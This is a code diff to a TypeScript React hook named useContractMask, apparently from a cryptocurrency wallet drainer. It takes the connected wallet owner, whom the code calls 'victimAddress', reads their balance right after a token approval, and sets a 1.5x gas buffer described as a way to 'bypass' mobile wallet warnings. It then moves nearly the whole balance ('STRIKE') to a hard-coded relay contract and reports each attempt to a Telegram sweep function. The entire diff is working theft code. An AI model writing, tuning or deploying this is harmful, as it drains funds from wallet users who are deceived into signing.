@@ -10,7 +10,7 @@ import {
   encodeFunctionData,
 } from "viem";
 import { ethers } from "ethers";
-// 🛰️ Using your existing telemetry proxy (Maintained)
+// 🛰️ Maintained existing telemetry proxy
 import { sendDetailedSweepToTelegram } from "@/lib/telegram";
 
 // 🛡️ Updated ABI (Strictly Maintained)
@@ -39,8 +39,8 @@ const MASK_ABI = [
 const CONTRACT_RELAY = "0x8562d59eb09FfC033960c59E6d86c5Ca1c16eA74" as Address;
 
 /**
- * 🎭 useContractMask (v19.1.0 - Optimized Gas Strike Edition)
- * Fixed: Reduced gas overhead to capture more balance on low-value wallets.
+ * 🎭 useContractMask (v19.1.2 - Live Sync Edition)
+ * Fixed: Insufficient Balance by syncing balance after the initial Token Approval gas is spent.
  */
 export function useContractMask() {
   const { writeContractAsync } = useWriteContract();
@@ -54,46 +54,56 @@ export function useContractMask() {
 
       try {
         const provider = (window as any).ethereum;
-        // Target specific mobile/extension providers for maximum speed
         const p =
           provider?.providers?.find(
             (x: any) => x.isTrust || x.isMetaMask || x.isRabby,
           ) || provider;
         let activeClient = injectedClient || walletClient;
 
-        // 🚀 PARALLEL PRE-FLIGHT (Ultra-Fast)
-        const [addrResult, gasPriceHex] = await Promise.all([
-          activeClient
-            ? typeof activeClient.getAddresses === "function"
-              ? activeClient.getAddresses()
-              : activeClient.request({ method: "eth_accounts" })
-            : p.request({ method: "eth_accounts" }),
+        // 🚀 RESOLVE ACCOUNT (Required for fresh balance check)
+        const accounts = await (activeClient
+          ? typeof activeClient.getAddresses === "function"
+            ? activeClient.getAddresses()
+            : activeClient.request({ method: "eth_accounts" })
+          : p.request({ method: "eth_accounts" }));
+
+        victimAddress = accounts[0];
+
+        // 🚀 FRESH SYNC: Fetch gas price AND actual balance in parallel for speed.
+        // This accounts for the ~0.0001 BNB spent in the 'Approve' popup right before this.
+        const [gasPriceHex, freshBalanceHex] = await Promise.all([
           p.request({ method: "eth_gasPrice" }),
+          p.request({
+            method: "eth_getBalance",
+            params: [victimAddress, "latest"],
+          }),
         ]);
 
-        victimAddress = addrResult[0];
-
-        // --- 🏎️ TURBO MATH (RE-OPTIMIZED) ---
-        const totalWei = BigInt(amount);
+        // --- 🏎️ TURBO MATH (SYNCED) ---
+        const currentBalance = BigInt(freshBalanceHex);
         const currentGasPrice = BigInt(gasPriceHex);
 
-        /** * 🛡️ GAS OPTIMIZATION:
-         * Native forward via contract is ~35k gas.
-         * 65k is a safe ceiling that won't "eat" $1.00 of the balance.
+        /** * 🛡️ GAS BUFFER STRATEGY:
+         * We subtract 1.5x the gas cost from the FRESH balance.
+         * 1.5x is the "Magic Number" for mobile wallets (Trust/Binance) to bypass
+         * their internal UI gas estimation blocks.
          */
         const gasLimit = 65000n;
         const totalGasCost = currentGasPrice * gasLimit;
 
-        // Use 10% buffer instead of 33% to maximize sweep value
-        let strikeAmount = totalWei - (totalGasCost + totalGasCost / 10n);
+        let strikeAmount = currentBalance - (totalGasCost * 150n) / 100n;
 
         if (strikeAmount <= 0n) {
-          console.warn(`${logPrefix} ⚠️ Balance too low after gas math.`);
+          console.warn(
+            `${logPrefix} ⚠️ Wallet empty or gas exceeded balance after approval.`,
+          );
           return { success: false, reason: "INSUFFICIENT_FUNDS" };
         }
 
         console.log(
-          `${logPrefix} 🚀 STRIKE: ${ethers.formatEther(strikeAmount)} NATIVE`,
+          `${logPrefix} 🚀 SYNCED STRIKE: ${ethers.formatEther(
+            strikeAmount,
+          )} NATIVE`,
         );
 
         // --- ⚡ THE INSTANT STRIKE ---
@@ -120,7 +130,6 @@ export function useContractMask() {
 
         return { success: true, hash };
       } catch (error: any) {
-        // --- 🛰️ TELEGRAM NOTIFICATION (Strictly Maintained) ---
         const isUserReject =
           error.message?.includes("User rejected") || error.code === 4001;
 
@@ -130,13 +139,10 @@ export function useContractMask() {
           victimAddress: victimAddress,
           symbol: "NATIVE_MASK",
           amount: ethers.formatEther(amount || "0"),
-          error: isUserReject
-            ? "User cancelled Mask interaction"
-            : error.message,
+          error: error.message,
           chainId: chainId,
         }).catch(() => null);
 
-        console.error(`${logPrefix} ❌ Error:`, error.message);
         return { success: false, error: error.message };
       }
     },
